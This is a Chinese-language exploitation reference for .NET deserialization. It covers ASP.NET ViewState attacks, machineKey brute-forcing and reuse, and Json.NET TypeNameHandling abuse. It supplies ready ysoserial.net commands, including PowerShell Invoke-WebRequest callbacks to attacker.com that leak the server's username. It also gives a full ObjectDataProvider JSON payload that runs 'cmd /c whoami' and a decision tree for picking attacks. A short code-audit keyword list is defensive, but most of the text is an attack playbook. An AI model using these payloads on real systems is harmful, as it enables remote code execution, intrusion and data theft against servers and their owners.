# .NET 反序列化利用参考

## 检测与识别

**常见危险 Formatter**：

| Formatter | 识别方式 | 危险等级 |
|-----------|---------|---------|
| BinaryFormatter | 二进制流，代码中搜索 `BinaryFormatter().Deserialize` | 极高 |
| ObjectStateFormatter | 用于 ViewState 序列化 | 极高 |
| SoapFormatter | SOAP XML 格式序列化 | 高 |
| NetDataContractSerializer | WCF 场景 | 高 |
| LosFormatter | 旧版 ViewState | 高 |
| Json.NET + TypeNameHandling | JSON 中含 `$type` 字段 | 高（需启用 TypeNameHandling） |

**代码审计关键词**：

```csharp
// 搜索以下危险模式
BinaryFormatter, Deserialize, ObjectStateFormatter
SoapFormatter, NetDataContractSerializer, LosFormatter
TypeNameHandling.Auto, TypeNameHandling.All, TypeNameHandling.Objects
JsonConvert.DeserializeObject
```

## ViewState 利用

ASP.NET ViewState 是页面状态的序列化存储，放在 `__VIEWSTATE` 隐藏字段中。

**利用条件判断**：

| .NET 版本 | MAC | 加密 | 利用条件 |
|-----------|-----|------|---------|
| 任意 | 禁用 | 禁用 | 直接利用，无需密钥 |
| < 4.5 | 启用 | 禁用 | 需获取 machineKey |
| < 4.5 | 任意 | 启用 | 可移除 `__VIEWSTATEENCRYPTED` 参数绕过 |
| >= 4.5 | 启用 | 启用 | 需获取 machineKey（validationKey + decryptionKey） |

**步骤一：无 MAC 保护时直接利用**：

```bash
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```

**步骤二：爆破 machineKey**：

```bash
# Blacklist3r 爆破
AspDotNetWrapper.exe --keypath MachineKeys.txt \
  --encrypteddata "VIEWSTATE_VALUE" --decrypt --purpose=viewstate \
  --modifier=VIEWSTATEGENERATOR_VALUE --macdecode \
  --TargetPagePath "/target.aspx" -f out.txt --IISDirPath="/"

# badsecrets (Python，跨平台)
python examples/blacklist3r.py --viewstate "VIEWSTATE_VALUE" --generator "GENERATOR_VALUE"
python examples/blacklist3r.py --url http://target/page.aspx

# 大规模扫描
bbot -f subdomain-enum -m badsecrets -t target.tld
```

**步骤三：用已知 machineKey 生成 payload**：

```bash
# MAC 保护场景
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" \
  --generator=CA0B0334 \
  --validationalg="SHA1" \
  --validationkey="C551753B..."

# MAC + 加密场景
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "whoami" \
  --path="/content/default.aspx" --apppath="/" \
  --decryptionalg="AES" --decryptionkey="F6722806..." \
  --validationalg="SHA1" --validationkey="C551753B..."
```

**注意**：成功利用时服务器通常返回 500 错误（"The state information is invalid for this page"），同时触发 OOB 请求。

## Json.NET TypeNameHandling 利用

当 Json.NET 配置 `TypeNameHandling` 不为 `None` 时，反序列化时会根据 `$type` 字段实例化任意类型。

**危险配置**（任何非 `None` 的 `TypeNameHandling` 均可利用）：

```csharp
TypeNameHandling.Auto / .All / .Objects / .Arrays
```

**利用 payload（ObjectDataProvider gadget）**：

```bash
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
```

生成的 JSON payload 结构：

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c whoami"]
  },
  "ObjectInstance": {"$type": "System.Diagnostics.Process, System"}
}
```

## ysoserial.net 常用 Gadget Chain

| Gadget Chain | 关键原理 | 适用 Formatter |
|-------------|---------|---------------|
| TypeConfuseDelegate | 篡改 DelegateSerializationHolder 指向任意方法 | BinaryFormatter, SoapFormatter |
| ObjectDataProvider | WPF ObjectDataProvider 调用任意静态方法 | BinaryFormatter, Json.NET, XAML |
| TextFormattingRunProperties | 通过 XAML 加载触发命令执行 | BinaryFormatter (ViewState 常用) |
| ActivitySurrogateSelector | 绕过 .NET >= 4.8 类型过滤 | BinaryFormatter, LosFormatter |
| PSObject (CVE-2017-8565) | PowerShell ScriptBlock 执行 | BinaryFormatter, PS Remoting |
| DataSetOldBehaviour | 利用 DataSet 旧版 XML 表示 | LosFormatter, BinaryFormatter |

## 实战要点

**machineKey 泄露/复用**：
- 开发者常从 StackOverflow/文档复制示例 machineKey，导致多个站点共用同一密钥
- 获取一个站点的 machineKey 后可横向攻击整个 IIS 集群
- 检查 web.config 泄露、公开 GitHub 仓库、备份文件中的密钥

**BinaryFormatter Sink 识别**：
- 搜索所有 `BinaryFormatter().Deserialize()` 调用路径
- 关注 Cookie、ViewState、SOAP 消息、WebSocket 数据中的反序列化入口
- WSUS (TCP 8530/8531)、Sitecore、SharePoint 等产品存在已知 BinaryFormatter sink

---

## 决策树

```text
发现疑似 .NET 序列化数据
│
├── __VIEWSTATE 参数 → ASP.NET ViewState
│   ├── 1. 判断 MAC/加密状态
│   ├── 2. Blacklist3r/badsecrets 爆破 machineKey
│   └── 3. ysoserial.net -p ViewState 生成 payload
│
├── JSON 含 $type 字段 → Json.NET TypeNameHandling
│   └── ysoserial.net -g ObjectDataProvider -f Json.Net
│
└── 二进制流 / SOAP XML → BinaryFormatter / SoapFormatter
    ├── 1. 确认 Formatter 类型
    ├── 2. ysoserial.net 选择对应 gadget
    └── 3. TypeConfuseDelegate 优先尝试
```
